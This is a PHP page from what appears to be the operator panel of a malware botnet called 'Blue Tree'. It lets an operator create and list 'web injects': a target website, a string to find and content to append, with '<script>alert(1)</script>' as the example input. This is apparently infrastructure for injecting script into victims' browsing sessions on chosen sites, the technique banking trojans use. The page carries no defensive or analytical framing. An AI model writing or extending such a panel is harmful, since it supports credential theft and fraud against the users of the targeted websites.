<?php
include_once("config.php");
if(!empty($_POST["host"]) && !empty($_POST["find"]) && !empty($_POST["replace"])){	
	$insert_task = "INSERT INTO `WebInjects` (`host`, `find`, `replace`, `status`) VALUES (:host, :find, :replace, '1')";
	if($sth = $db->prepare($insert_task)){
		$sth->bindParam(":host", $_POST["host"]);
		$sth->bindParam(":find", $_POST["find"]);
		$sth->bindParam(":replace", $_POST["replace"]);
		$sth->execute();
	}
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Blue Tree - Manage Injects</title>
	<link rel="stylesheet" href="assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<link rel="stylesheet" href="css/bootstrap-extend.css">
	<link rel="stylesheet" href="css/master_style.css">
	<link rel="stylesheet" href="css/skins/_all-skins.css">
    <link href="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <a href="index.php" class="logo">
      
	  <b class="logo-lg">
		  <span ><p> Blue Tree </p>
	  </b>
    </a>
  </header>
  
  <?php

include_once("sidebar.php");
?>

  <div class="content-wrapper">
    <section class="content-header">
      <h1>
        Blue Tree
        <small>Manage Injects</small>
      </h1>
    </section>

    <section class="content">
	 

<div class="row">
 <div class="col-12">
          <div class="box">
            <div class="box-header with-border">
              <h4 class="box-title">Create Inject</h4>
            </div>
            <div class="box-body">
              <form role="form" method="POST">
                
                <div class="form-group has-success">
                  <center><label class="control-label" for="website">Website</label></center>
                  <input type="text" class="form-control" id="website" placeholder="Enter website..." name="host">
                </div>
                <div class="form-group has-success">
                  <center><label class="control-label" for="find">Data to Find</label></center>
                  <input type="text" class="form-control" id="find" placeholder="<div>" name="find">
                  <center><span class="help-block">This is the data that will be searched for on the website!</span></center>
                </div>
                
                <div class="form-group has-success">
                  <center><label class="control-label" for="replace">Data to Replace</label></center>
                  <input type="text" class="form-control" id="replace" placeholder="<script>alert(1)</script>" name="replace">
                  <center><span class="help-block">This Data will be appended to the end of the data to find!</span></center>
                </div>


                <div class="box-footer">
					<button type="submit" class="btn btn-danger">Cancel</button>
					<button type="submit" class="btn btn-success pull-right">Submit</button>
				</div>
              </form>
            </div>
          </div>
        </div>
	</div>
	  
	  
	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Current Injects</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>Website</th>
							<th>Status</th>
							<th>Date Added</th>
							<th>Options</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$WebInjects = "SELECT * FROM `WebInjects`";
					if($sth = $db->prepare($WebInjects)){
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							
							echo "<tr><td>".$row["host"]."</td><td>".$task_status_array[$row["status"]]."</td><td>".$row["time_executed"]."</td><td><a href='manageinject.php?id=".$row["id"]."' type='submit' class='btn btn-success'>Manage Inject</a></td></tr>";
						}
					}
					
					?>
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
		  
      </div>
    </section>
  </div>
  <footer class="main-footer">
	<center><b><u>Blue Tree</u></b></center>
  </footer>
  <div class="control-sidebar-bg"></div>
  
</div>

	<script src="assets/vendor_components/jquery/dist/jquery.js"></script>
	<script src="assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	<script src="assets/vendor_components/popper/dist/popper.min.js"></script>
	<script src="assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	<script src="assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<script src="assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<script src="assets/vendor_components/jquery.peity/jquery.peity.js"></script>
	<script src="assets/vendor_components/raphael/raphael.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-us-aea-en.js"></script>
	<script src="js/template.js"></script>
	<script type="text/javascript">

	</script>
	
</body>
</html>
